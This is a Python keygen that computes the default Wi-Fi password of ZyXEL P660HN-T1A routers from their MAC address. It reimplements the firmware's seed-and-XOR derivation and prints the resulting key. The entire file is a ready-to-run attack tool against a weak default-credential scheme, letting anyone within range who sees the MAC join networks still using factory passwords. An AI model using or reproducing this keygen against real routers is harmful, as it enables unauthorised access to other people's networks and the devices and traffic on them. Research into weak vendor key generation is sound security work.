# keygen for the p660hn-t1a with a SSID of ZyXELddddlll
# not for the p660n-t1a (close but some weird capitalization)
# nor the AMG1202-T10A and AMG1302-T10A that have a similar SSID.
# also not the Irish Eircom models
# thanks to dev-zzo for his router tools that allow the extraction of the RasCode from the firmware.
# https://github.com/dev-zzo/router-tools

import hashlib
import argparse

def p660hn_t1a(mac):

	long_mac = mac * 4
	seed = int("12345678", 16)
	pseudo_random = []

	for i in range(0, 40, 2):
		int1 = int(long_mac[i:i+2], 16)
		xor_mask1 = seed & 255
		xor_mask2 = seed >> 5 & 255
		new_byte1 = int1 ^ xor_mask1
		new_byte2 = new_byte1 ^ xor_mask2
		pseudo_random.append(new_byte2)

		new_seed = seed >> 8
		seed_modifier = new_byte2 << 15
		seed = new_seed | seed_modifier

	digits = ""
	for i in pseudo_random:
		digits += chr(48 + i % 10)

	letters = ""
	for i in pseudo_random:
		letters += chr(97 + i % 26)

	ssid = "ZyXEL%s%s" % (digits[4:8], letters[3:6])
	password = letters[10:20]
	#print(ssid)
	print(password)
parser = argparse.ArgumentParser(description='Keygen for p660hn-t1a with a SSID of ZyXELddddlll')
parser.add_argument('mac', help='Mac address')
args = parser.parse_args()

p660hn_t1a(args.mac)
